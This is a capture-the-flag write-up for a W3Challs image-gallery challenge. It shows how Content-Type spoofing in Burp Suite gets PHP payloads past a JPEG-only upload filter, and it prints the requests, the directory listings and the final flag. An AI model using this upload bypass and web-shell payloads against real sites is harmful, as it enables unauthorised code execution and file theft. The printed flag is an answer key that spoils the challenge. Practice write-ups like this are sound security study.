# An image gallery

1. First, lets go through the website.
2. Then, we can see the information in the home page : You can upload pictures with the upload formular. Pictures are then stored in the suggestions directory. 
3. If you try to visit the "suggestions directory", you will find out that you are forbiddened. However, you can still visit the picture part of it. For example, upload a jpeg file named 123.jpeg, and you are able to visit the picture as the url : http://gallery.hax.w3challs.com/suggestions/123
4. So, there is something come up in my mind, what if we could upload some php code that allows us to visit the directory so that we can find the flag. (The goal is to find a directory that store the flag) However, there is warning in the home page : For security reasons, only jpeg files are accepted.
5. As you can see, we cannot upload php file, but what if we can bypass it? Here is some [information](https://www.hackingarticles.in/5-ways-file-upload-vulnerability-exploitation/) that I find in the web.
6. After we know some ways to bypass it, we need a tool : burp suite to help us. 
7. Now, we have to think of some php code that can help us. Here is my payload : 
    ```php
    <php?
        var_dump(scandir('..'));
    ?>
    ```
    After doing so, we named a file "upload.php" and send it. Here is some information in burp suite : 
    ```
    Content-Disposition: form-data; name="upload_file"; filename="upload.php"
    Content-Type: text/php

    <?php
        var_dump(scandir('..'));
    ?>
    ```
    I use the method under "Content-Type file Upload" in the website (of course you can anothor method to reach the goal), so I change the payload and send it : 
    ```
    Content-Disposition: form-data; name="upload_file"; filename="upload.php"
    Content-Type: image/jpeg

    <?php
        var_dump(scandir('..'));
    ?>
    ```
    And get the feedback : The file upload.php has been uploaded correctly..
8. Next step now is visit http://gallery.hax.w3challs.com/suggestions/upload.php and I get the information below : 
    ```php
    array(11) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "basic.css" [3]=> string(3) "css" [4]=> string(6) "images" [5]=> string(9) "index.php" [6]=> string(2) "js" [7]=> string(4) "lang" [8]=> string(8) "lang.php" [9]=> string(14) "omg_secret_wut" [10]=> string(11) "suggestions" } 
    ```
    So, there is a very "interesting" file named "omg_secret_wut", I decide to take a look. 
    ```php
    <?php
        var_dump(scandir('../omg_secret_wut'));
    ?>
    ```
    Then I get : 
    ```php
    array(3) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(4) "flag" } 
    ```
9. As you can see, there is the flag. Here is my payload to get it : 
    ```php
    <?php
        var_dump(file_get_contents('../omg_secret_wut/flag'));
    ?>
    ```
10. Here is the flag : W3C{W3lc0m3_t0_y0u_w3b_sh3ll}
